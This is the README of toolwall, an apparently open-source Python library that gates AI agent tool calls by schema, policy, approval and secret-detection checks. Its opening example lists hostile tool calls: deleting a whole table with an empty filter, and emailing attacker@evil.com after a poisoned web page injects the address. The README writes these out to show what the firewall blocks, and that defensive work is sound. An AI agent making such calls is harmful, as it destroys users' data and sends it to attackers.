# toolwall

[![PyPI version](https://img.shields.io/pypi/v/toolwall.svg)](https://pypi.org/project/toolwall/)
[![Python versions](https://img.shields.io/pypi/pyversions/toolwall.svg)](https://pypi.org/project/toolwall/)
[![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](toolwall/LICENSE)
[![Tests](https://img.shields.io/badge/tests-85%20passing-brightgreen.svg)](toolwall/tests)
[![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](toolwall/pyproject.toml)
[![Failure suite](https://img.shields.io/badge/attack%20suite-24%2F24%20blocked-brightgreen.svg)](gate-suite/results/REPORT.md)

> **Fail-closed firewall for AI agent tool calls.**
> Structured outputs guarantee your agent's tool calls are *well-formed*. toolwall guarantees they're *allowed*.

**Status: v0.2.1 (alpha) · [on PyPI](https://pypi.org/project/toolwall/) · Phase 0 + Phase 1 complete · 85 tests · published failure suite.**

```bash
pip install toolwall
```

---

## The problem

Constrained decoding solved malformed JSON. It did nothing for this:

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # address injected via a poisoned web page
db_query(limit=10_000_000)           # schema-valid. production melts.
```

Every one of these is a **valid-but-wrong** call. Nothing in the platform stack blocks it.

## What toolwall does

```
LLM tool call (OpenAI / Anthropic / Gemini native JSON, no custom format)
        │
        ▼
   ┌─ toolwall ────────────────────────────────┐
   │  registered tool?  schema ok?  policy ok? │──BLOCK──► logged, never executed
   └───────────────┬───────────────────────────┘
                   ▼ ALLOW
              tool(**args)
```

```python
from toolwall import Gate, Meter, Policy, Shield, ToolSchema, in_range, not_empty

gate = Gate(default="deny", meter=Meter(), shield=Shield(mode="block"))
gate.register("db_query", db_query,
              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
              policy=Policy(constraints={"limit": in_range(1, 100)}))
gate.register("delete_records", delete_records,
              schema=ToolSchema(required=["filter"], types={"filter": dict}),
              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
gate.budget(max_calls=20)

result = gate.run(openai_response)   # any provider shape, or a plain dict
# result.verdict: ALLOW | BLOCK | NEEDS_APPROVAL. Only ALLOW executes.
```

- **Zero required dependencies**: stdlib only, drops into any Python agent
- **Fail-closed**: unknown tool, schema violation, policy violation, budget hit, unparseable payload: blocked
- **Policy engine**: value constraints, cross-arg rules, human-approval flags, budget caps
- **Shield**: secret detection (AWS/OpenAI/GitHub/Stripe/JWT/PEM patterns + entropy) blocks exfil through tool args; audit log never contains the value
- **Audit trail**: every verdict exported to JSON/CSV (`toolwall report audit.json`)

**Current proof:** the published suite blocks **24/24 attack cases across 9 classes
with 0 false blocks** on clean traffic, at p95 0.07 ms overhead
([full report](gate-suite/results/REPORT.md), run it yourself: `python gate-suite/run_suite.py`).
Detection is pattern + entropy based and is never 100%; the report states exactly
what is and is not proven.

Install:

```bash
pip install toolwall
```

Try it without an API key (from a clone):

```bash
cd toolwall
python examples/quickstart.py             # 6 gated scenarios
python examples/dangerous_agent_demo.py   # off-the-rails agent, with vs without the gate
```

### Dry-run: see what your agent would do, before it does anything

```python
gate = Gate(default="deny", dry_run=True, meter=Meter())
# ... run your agent; ALLOW calls are simulated, never executed ...
print(gate.report())                 # verdict counts, blocked reasons, secrets caught
print(suggest_policies(gate))        # draft schema+policy from what was observed, for you to review
```

### Guard an MCP server

```python
from toolwall import Gate, MCPGuard
guard = MCPGuard(gate, forward=call_downstream_mcp_server)
decision = guard.handle(tool_name, args)   # only ALLOW is forwarded; blocks return an MCP error
```

See `examples/mcp_guard_demo.py`. Install the transport extra with `pip install 'toolwall[mcp]'`.

## Roadmap (Phase 0 → 1)

- [x] Provider intake (OpenAI chat + responses, Anthropic, Gemini, plain dict)
- [x] Fail-closed gate + schema layer + audit meter
- [x] Policy engine: value constraints, cross-arg rules, approval flags, budget caps
- [x] Shield: secret detection/redaction on tool args and text (registration is the allowlist)
- [x] Failure-scenario suite: 24 attacks across 9 classes, report published per release
- [x] Dry-run mode: full agent run, zero execution, `gate.report()` "would-have-done" summary
- [x] Suggested-policy generator: observed calls -> reviewable draft schema + policy
- [x] `toolwall-mcp`: `MCPGuard` puts the gate in front of any MCP server (tested core; stdio wiring lands with first pilot)
- [x] Release-ready: builds clean, `twine check` passes, clean-install verified ([RELEASING.md](toolwall/RELEASING.md))
- [x] **Published to PyPI** — [`pip install toolwall`](https://pypi.org/project/toolwall/)

## What happened to TOAP?

This repo used to be **TOAP**, a token-compression DSL for tool calls. We measured it honestly and killed it. The full postmortem (real numbers, tokenizer analysis, lessons) is on the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/Project_TOAP/tree/toap-v0.1-archive) branch. toolwall keeps the part of TOAP that was never about compression: the fail-closed checkpoint between the model and your tools.

## License

MIT, see [LICENSE](LICENSE)

Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops)
